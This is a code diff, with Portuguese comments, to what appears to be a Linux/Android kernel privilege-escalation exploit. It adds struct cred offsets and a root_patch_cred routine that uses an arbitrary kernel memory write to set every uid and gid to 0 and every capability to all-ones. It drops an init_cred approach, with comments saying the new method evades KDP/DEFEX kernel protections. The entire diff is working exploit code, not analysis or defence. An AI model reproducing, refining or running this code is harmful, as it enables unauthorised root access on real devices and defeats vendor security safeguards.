@@ -19,6 +19,21 @@ uint32_t root_uid_after = 0xffffffff;
 #define TASK_STRUCT_PID_OFF       0x630   /* pid_t pid @ 1584 */
 #define TASK_STRUCT_COMM_OFF      0x848   /* char comm[16] @ 2120 */
 
+/* === Offsets da struct cred (6.1.157 via BTF do vmlinux REAL) === */
+#define CRED_UID_OFF              0x04    /* kuid_t uid */
+#define CRED_GID_OFF              0x08    /* kgid_t gid */
+#define CRED_SUID_OFF             0x0c    /* kuid_t suid */
+#define CRED_SGID_OFF             0x10    /* kgid_t sgid */
+#define CRED_EUID_OFF             0x14    /* kuid_t euid */
+#define CRED_EGID_OFF             0x18    /* kgid_t egid */
+#define CRED_FSUID_OFF            0x1c    /* kuid_t fsuid */
+#define CRED_FSGID_OFF            0x20    /* kgid_t fsgid */
+#define CRED_CAP_INHERITABLE_OFF  0x28    /* kernel_cap_t cap_inheritable */
+#define CRED_CAP_PERMITTED_OFF    0x30    /* kernel_cap_t cap_permitted */
+#define CRED_CAP_EFFECTIVE_OFF    0x38    /* kernel_cap_t cap_effective */
+#define CRED_CAP_BSET_OFF         0x40    /* kernel_cap_t cap_bset */
+#define CRED_CAP_AMBIENT_OFF      0x48    /* kernel_cap_t cap_ambient */
+
 static int root_read_data(
     int fd, uintptr_t target, void *data, size_t len) {
   return pipe_phys_read_data(fd, target, data, len);
@@ -227,7 +242,73 @@ static uintptr_t root_get_current_task(int fd) {
 }
 
 /*
- * Inline root escalation — sem fork+exec, sem binario externo.
+ * Modifica o cred existente do processo para root.
+ * NÃO usa init_cred (protegido por KDP/DEFEX).
+ */
+static int root_patch_cred(int fd, uintptr_t cred_addr, const char *name) {
+  if (!cred_addr) {
+    pr_error("root inline: %s is NULL\n", name);
+    return 0;
+  }
+
+  /* Sanity: cred deve estar em kernel space */
+  if ((cred_addr & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
+    pr_error("root inline: %s looks invalid: %016zx\n", name, cred_addr);
+    return 0;
+  }
+
+  pr_info("root inline: patching %s at %016zx\n", name, cred_addr);
+
+  /* Ler cred atual pra debug */
+  uint32_t old_uid = 0, old_gid = 0, old_euid = 0;
+  root_read32(fd, cred_addr + CRED_UID_OFF, &old_uid);
+  root_read32(fd, cred_addr + CRED_GID_OFF, &old_gid);
+  root_read32(fd, cred_addr + CRED_EUID_OFF, &old_euid);
+  pr_info("root inline: %s before uid=%d gid=%d euid=%d\n",
+          name, old_uid, old_gid, old_euid);
+
+  /* Escrever uid=0, gid=0, euid=0, egid=0, suid=0, sgid=0, fsuid=0, fsgid=0 */
+  int ok = 1;
+  ok &= root_write32_exact(fd, cred_addr + CRED_UID_OFF, 0);
+  ok &= root_write32_exact(fd, cred_addr + CRED_GID_OFF, 0);
+  ok &= root_write32_exact(fd, cred_addr + CRED_SUID_OFF, 0);
+  ok &= root_write32_exact(fd, cred_addr + CRED_SGID_OFF, 0);
+  ok &= root_write32_exact(fd, cred_addr + CRED_EUID_OFF, 0);
+  ok &= root_write32_exact(fd, cred_addr + CRED_EGID_OFF, 0);
+  ok &= root_write32_exact(fd, cred_addr + CRED_FSUID_OFF, 0);
+  ok &= root_write32_exact(fd, cred_addr + CRED_FSGID_OFF, 0);
+
+  if (!ok) {
+    pr_error("root inline: %s uid/gid write failed\n", name);
+    return 0;
+  }
+
+  /* Setar todas as capabilities para ~0 (tudo permitido) */
+  uint64_t all_caps = ~0ULL;
+  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_INHERITABLE_OFF, all_caps);
+  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_PERMITTED_OFF, all_caps);
+  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_EFFECTIVE_OFF, all_caps);
+  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_BSET_OFF, all_caps);
+  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_AMBIENT_OFF, all_caps);
+
+  if (!ok) {
+    pr_error("root inline: %s capabilities write failed\n", name);
+    return 0;
+  }
+
+  /* Verificar readback */
+  uint32_t new_uid = 0xdeadbeef;
+  uint64_t new_cap = 0xdeadbeefdeadbeefULL;
+  root_read32(fd, cred_addr + CRED_UID_OFF, &new_uid);
+  root_read64(fd, cred_addr + CRED_CAP_EFFECTIVE_OFF, &new_cap);
+  pr_info("root inline: %s after uid=%d cap_effective=%016zx\n",
+          name, new_uid, new_cap);
+
+  return 1;
+}
+
+/*
+ * Inline root escalation — modifica cred existente (evita KDP/DEFEX).
  */
 static int install_inline_root(int fd) {
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
@@ -272,48 +353,29 @@ static int install_inline_root(int fd) {
   }
   pr_info("root inline: current_task=%016zx\n", current_task);
 
-  /* === 2. Resolver init_cred COM KASLR === */
-  uint64_t init_cred = data_addr(INIT_CRED);
-  pr_info("root inline: init_cred=%016zx (raw=%016zx)\n", 
-          init_cred, (uint64_t)INIT_CRED);
+  /* === 2. Ler ponteiros cred e real_cred atuais === */
+  uint64_t cred_ptr = 0, real_cred_ptr = 0;
+  if (!root_read64(fd, current_task + TASK_STRUCT_CRED_OFF, &cred_ptr) ||
+      !root_read64(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, &real_cred_ptr)) {
+    pr_error("root inline: failed to read cred pointers\n");
+    goto cleanup;
+  }
+  pr_info("root inline: current cred=%016zx real_cred=%016zx\n",
+          cred_ptr, real_cred_ptr);
 
-  /* === SANITY CHECK CRÍTICO: init_cred deve estar em área de kernel === */
-  if ((init_cred & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
-    pr_error("root inline: init_cred looks invalid (not in kernel space): %016zx\n",
-             init_cred);
+  /* === 3. Patch cred === */
+  if (!root_patch_cred(fd, cred_ptr, "cred")) {
     goto cleanup;
   }
 
-  /* === SANITY CHECK: ler init_cred pra confirmar que é acessível === */
-  uint64_t init_cred_test = 0;
-  if (!root_read64(fd, init_cred, &init_cred_test)) {
-    pr_error("root inline: cannot read init_cred at %016zx — aborting to avoid panic\n",
-             init_cred);
-    goto cleanup;
+  /* === 4. Patch real_cred === */
+  if (real_cred_ptr != cred_ptr) {
+    if (!root_patch_cred(fd, real_cred_ptr, "real_cred")) {
+      goto cleanup;
+    }
+  } else {
+    pr_info("root inline: real_cred == cred, skipping duplicate patch\n");
   }
-  pr_info("root inline: init_cred readable, first qword=%016zx\n", init_cred_test);
-
-  /* === 3. Escrever init_cred em cred e real_cred === */
-  if (!root_write64_exact(fd, current_task + TASK_STRUCT_CRED_OFF, init_cred) ||
-      !root_write64_exact(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, init_cred)) {
-    pr_error("root inline: cred overwrite failed\n");
-    goto cleanup;
-  }
-  pr_info("root inline: cred -> init_cred\n");
-
-  /* === 4. Verificar readback antes de setuid === */
-  uint64_t cred_readback = 0, real_cred_readback = 0;
-  if (!root_read64(fd, current_task + TASK_STRUCT_CRED_OFF, &cred_readback) ||
-      !root_read64(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, &real_cred_readback)) {
-    pr_error("root inline: cred readback failed\n");
-    goto cleanup;
-  }
-  if (cred_readback != init_cred || real_cred_readback != init_cred) {
-    pr_error("root inline: cred readback mismatch cred=%016zx real_cred=%016zx expected=%016zx\n",
-             cred_readback, real_cred_readback, init_cred);
-    goto cleanup;
-  }
-  pr_info("root inline: cred readback verified ok\n");
 
   /* === 5. Aplicar no userspace === */
   if (setuid(0) != 0) {
